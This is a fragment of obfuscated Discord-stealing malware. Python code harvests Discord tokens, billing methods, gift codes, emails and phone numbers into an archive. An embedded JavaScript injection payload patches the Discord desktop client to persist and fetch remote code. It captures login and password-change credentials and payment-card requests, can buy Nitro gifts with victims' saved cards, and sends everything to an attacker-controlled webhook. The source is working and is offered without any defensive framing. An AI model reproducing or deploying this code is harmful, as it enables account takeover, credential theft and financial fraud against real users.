                BFXJDCJWCHNKISVJBPBEZQAAZPRVWFCBZIYTLPZXHOSCVTRSTKZUKPSASMNLGHEQYVXYLUGL = 'False'
        except:
            BFXJDCJWCHNKISVJBPBEZQAAZPRVWFCBZIYTLPZXHOSCVTRSTKZUKPSASMNLGHEQYVXYLUGL = "None"

        try: QQHNLADDCMSKXPDBZXQBBJMBEYBJLBOOKQGESYGVKLULFXZLMWWLZFBXCZWLYWZUFWZISGTOAG = f"https://cdn.discordapp.com/avatars/{KOQZQFGKJKNXMWVZOBENFGZCXPXAQIGCTOUNHTHRPAXAPVLFFNMCULLNAUNWBIEXQFUCSZYMEHIUDBWLU}/{GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{KOQZQFGKJKNXMWVZOBENFGZCXPXAQIGCTOUNHTHRPAXAPVLFFNMCULLNAUNWBIEXQFUCSZYMEHIUDBWLU}/{GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{KOQZQFGKJKNXMWVZOBENFGZCXPXAQIGCTOUNHTHRPAXAPVLFFNMCULLNAUNWBIEXQFUCSZYMEHIUDBWLU}/{GFJMHVXRMXVWTVSAIDJJMYDCHSXRTXUQCEHQDFCZUBEHCMNUOYCIRGDHOOHXHULBWGZSXNYNCIZRYQELSXQDKJMYYCCVGPDZD['avatar']}.png"
        except: QQHNLADDCMSKXPDBZXQBBJMBEYBJLBOOKQGESYGVKLULFXZLMWWLZFBXCZWLYWZUFWZISGTOAG = "None"

        try:
            JYYLTCFKYTVONLUAOSWVXEALQTHHORTEYAVXYJUAUHYHRVCXAFPLRKYTJAWDQBJCMGHVZDKCVRKTMFX = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO_d15c0rd}).json()
            if JYYLTCFKYTVONLUAOSWVXEALQTHHORTEYAVXYJUAUHYHRVCXAFPLRKYTJAWDQBJCMGHVZDKCVRKTMFX:
                KRFYAXCDDFVGNEACSOICQXBHAUEJGWZUGAMKYFCLMFDZMSDQTASUCUHMUKRJVI = []

                for v4r_method in JYYLTCFKYTVONLUAOSWVXEALQTHHORTEYAVXYJUAUHYHRVCXAFPLRKYTJAWDQBJCMGHVZDKCVRKTMFX:
                    if v4r_method['type'] == 1:
                        KRFYAXCDDFVGNEACSOICQXBHAUEJGWZUGAMKYFCLMFDZMSDQTASUCUHMUKRJVI.append('Bank Card')
                    elif v4r_method['type'] == 2:
                        KRFYAXCDDFVGNEACSOICQXBHAUEJGWZUGAMKYFCLMFDZMSDQTASUCUHMUKRJVI.append("Paypal")
                    else:
                        KRFYAXCDDFVGNEACSOICQXBHAUEJGWZUGAMKYFCLMFDZMSDQTASUCUHMUKRJVI.append('Other')
                KRFYAXCDDFVGNEACSOICQXBHAUEJGWZUGAMKYFCLMFDZMSDQTASUCUHMUKRJVI = ' / '.join(KRFYAXCDDFVGNEACSOICQXBHAUEJGWZUGAMKYFCLMFDZMSDQTASUCUHMUKRJVI)
            else:
                KRFYAXCDDFVGNEACSOICQXBHAUEJGWZUGAMKYFCLMFDZMSDQTASUCUHMUKRJVI = "None"
        except:
            KRFYAXCDDFVGNEACSOICQXBHAUEJGWZUGAMKYFCLMFDZMSDQTASUCUHMUKRJVI = "None"

        try:
            NPRZVSYKPGXXSOKTQQZJWHUIKMRCWEDFPZEPZKHNBHZARWKOHNZFSCXHDTLPMFPYMURDSTLLPHJOBW = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO_d15c0rd}).json()
            if NPRZVSYKPGXXSOKTQQZJWHUIKMRCWEDFPZEPZKHNBHZARWKOHNZFSCXHDTLPMFPYMURDSTLLPHJOBW:
                TKPLKHJRZNRNTNUTECRLOBAVGCUFCZPETRKKFGAASDKJIAPEGWLUVEYSNGU = []
                for NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO in NPRZVSYKPGXXSOKTQQZJWHUIKMRCWEDFPZEPZKHNBHZARWKOHNZFSCXHDTLPMFPYMURDSTLLPHJOBW:
                    GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ = NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO['promotion']['outbound_title']
                    NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO = NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO['code']
                    MIFNVTMJWDRULMJOTOTMFHMVBNJKOEWJUHHRDHVCLRHSCECECAY = f"Gift: \"{GAUSDQNQLCWPABKDAPVIELBEFTEUIEMAVYNVQNQBUSTNJWGKUKQQJEPARPTJMUTCFGVGSZNIUJ}\" Code: \"{NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO}\""
                    if len('\n\n'.join(NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO)) + len(MIFNVTMJWDRULMJOTOTMFHMVBNJKOEWJUHHRDHVCLRHSCECECAY) >= 1024:
                        break
                    TKPLKHJRZNRNTNUTECRLOBAVGCUFCZPETRKKFGAASDKJIAPEGWLUVEYSNGU.append(MIFNVTMJWDRULMJOTOTMFHMVBNJKOEWJUHHRDHVCLRHSCECECAY)
                if len(TKPLKHJRZNRNTNUTECRLOBAVGCUFCZPETRKKFGAASDKJIAPEGWLUVEYSNGU) > 0:
                    NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO = '\n\n'.join(TKPLKHJRZNRNTNUTECRLOBAVGCUFCZPETRKKFGAASDKJIAPEGWLUVEYSNGU)
                else:
                    NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO = "None"
            else:
                NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO = "None"
        except:
            NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO = "None"
    
        try: v4r_software_name, YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO = SNGCZZSMXIWXSIUAXBYLXPTZABAPZDBUGTLEUBTIYNOGETYGOTDAEEXWCDPLCDOYPGVTHHLSPWOUVJCOCUOLITF.get(LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO_d15c0rd, ("Unknown", "Unknown"))
        except: v4r_software_name, YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO = "Unknown", "Unknown"

        HSWJCCJQASWMWJJBZWZGDIGUKFGRZNVJWOGJDDZXCCZIOTMOWLJRLPSWMSJBTSWYR = HSWJCCJQASWMWJJBZWZGDIGUKFGRZNVJWOGJDDZXCCZIOTMOWLJRLPSWMSJBTSWYR + f"""
Discord Account n°{str(MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV)}:
 - Path Found      : {YMHTLEVUYBVUFJPCZAYGVHBECHIBMQBYBNJNHMTENJQRHHAOIOGSCRSCQQO}
 - Software        : {v4r_software_name}
 - Token           : {LFKRYDUBDEYTXHWHKRZFTLNFHLHPLXFXHCTDZOQPHHNXHEJMVNJNEDHPRSZIRMTPNHITPJVXEEBHIEZTAFNSSGPGGTO_d15c0rd}
 - Username        : {DEMMOKXVDNILNFGIFQEZYQHZGKDKIUDHJCFWPYXSIRFIZJYDMABEMLMZVYHTPJURHXMJIZCMXDEIXQQNQOCVHNPGKFVEYZBQQ}
 - Display Name    : {BSAZXONCPUCGAWKSTUQSOJTFFBMAXQDMREKDZCPTCMYYSYFMHXITOIJDDFHXMU}
 - Id              : {KOQZQFGKJKNXMWVZOBENFGZCXPXAQIGCTOUNHTHRPAXAPVLFFNMCULLNAUNWBIEXQFUCSZYMEHIUDBWLU}
 - Email           : {MMGBHMMXNAEDXRJWKKFSGTWDSUMDHQSDKJIUUHCZBSAEVMWMHSLUWJZURIWS}
 - Email Verified  : {FEQRBSTQKMVDUJMEPWVEUYVITGQMRTDHOLOQMJEDKZASDCLDTFLMGVJNJGVUMXJHEVYDOJKQPCRBAXFB}
 - Phone           : {WSKUAFXPAHIGBHINJXYROFZGPAOVAXSLZJWNAJZHJTRZIMEBBOBZNHQJJRZXPAJOG}
 - Nitro           : {BFXJDCJWCHNKISVJBPBEZQAAZPRVWFCBZIYTLPZXHOSCVTRSTKZUKPSASMNLGHEQYVXYLUGL}
 - Language        : {EHOQNSDQARDOOQFCTRMRLRGVNMTUCWLAOENXSUYWYXDRTBIURBSUXOZYTNSASOJUPEHORKDUXNUDMNUCWMFZJJUMXPY}
 - Billing         : {KRFYAXCDDFVGNEACSOICQXBHAUEJGWZUGAMKYFCLMFDZMSDQTASUCUHMUKRJVI}
 - Gift Code       : {NYYQZOIFIQYGNNJZVYYLEZCMEXYBTBIIZLMRKIEFZLZUAXSMUJMVBFPCTZOKDPNQEVXVOCXCSJLYYMLKJEELTAECROSO}
 - Profile Picture : {QQHNLADDCMSKXPDBZXQBBJMBEYBJLBOOKQGESYGVKLULFXZLMWWLZFBXCZWLYWZUFWZISGTOAG}
 - Multi-Factor Authentication : {HITLUHPRZDCABLEWJPILKZJEUAWFCJRFONHZPZZRYMXAGBOYHYHXWCSSNEAVFLAIGLHDHDJRTHJICUN}
"""
    BZIYYLUWDNIZDTKATBBTZLAWXFJNPSAFVPDMUEBNXCWLEVKNRDTCKFOGVRQKNQNCFJVASKI.writestr(f"Discord Accounts ({MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV}).txt", HSWJCCJQASWMWJJBZWZGDIGUKFGRZNVJWOGJDDZXCCZIOTMOWLJRLPSWMSJBTSWYR)

    return MVORSKFSYNELBCHBUUYXVSDOHYZQWXZSJPJGKWJDALFVXLLSIQLUDGLOPLLYJVIUWBDFZLJTOJKLLQZSTAJZTRZQHIQV

TYJKFJJOFEUCHPUBEKNNXGIUWEGTIOCXVTALOURTAHUOWSFGHWHDYXY = r"""
const args = process.argv;
const fs = require('fs');
const path = require('path');
const https = require('https');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron');

const config = {
  webhook: '%WEBHOOK_HERE%', 
  webhook_protector_key: '%WEBHOOK_KEY%', 
  auto_buy_nitro: false, 
  ping_on_run: true, 
  ping_val: '@everyone',
  ip_address_public: '%IP_PUBLIC%',
  username: '%USERNAME%',
  embed_name: '%EMBED_NAME%', 
  embed_icon: '%EMBED_ICON%'.replace(/ /g, '%20'), 
  footer_text: '%FOOTER_TEXT%',
  embed_color: %EMBED_COLOR%, 
  injection_url: '', 
  api: 'https://discord.com/api/v9/users/@me',
  nitro: {
    boost: {
      year: {
        id: '521847234246082599',
        sku: '511651885459963904',
        price: '9999',
      },
      month: {
        id: '521847234246082599',
        sku: '511651880837840896',
        price: '999',
      },
    },
    classic: {
      month: {
        id: '521846918637420545',
        sku: '511651871736201216',
        price: '499',
      },
    },
  },
  filter: {
    urls: [
      'https://discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/users/@me',
      'https://*.discord.com/api/v*/users/@me',
      'https://discordapp.com/api/v*/auth/login',
      'https://discord.com/api/v*/auth/login',
      'https://*.discord.com/api/v*/auth/login',
      'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
      'https://api.stripe.com/v*/tokens',
      'https://api.stripe.com/v*/setup_intents/*/confirm',
      'https://api.stripe.com/v*/payment_intents/*/confirm',
    ],
  },
  filter2: {
    urls: [
      'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json',
      'https://*.discord.com/api/v*/applications/detectable',
      'https://discord.com/api/v*/applications/detectable',
      'https://*.discord.com/api/v*/users/@me/library',
      'https://discord.com/api/v*/users/@me/library',
      'wss://remote-auth-gateway.discord.gg/*',
    ],
  },
};

function parity_32(x, y, z) {
  return x ^ y ^ z;
}
function ch_32(x, y, z) {
  return (x & y) ^ (~x & z);
}

function maj_32(x, y, z) {
  return (x & y) ^ (x & z) ^ (y & z);
}
function rotl_32(x, n) {
  return (x << n) | (x >>> (32 - n));
}
function safeAdd_32_2(a, b) {
  var lsw = (a & 0xffff) + (b & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function safeAdd_32_5(a, b, c, d, e) {
  var lsw = (a & 0xffff) + (b & 0xffff) + (c & 0xffff) + (d & 0xffff) + (e & 0xffff),
    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
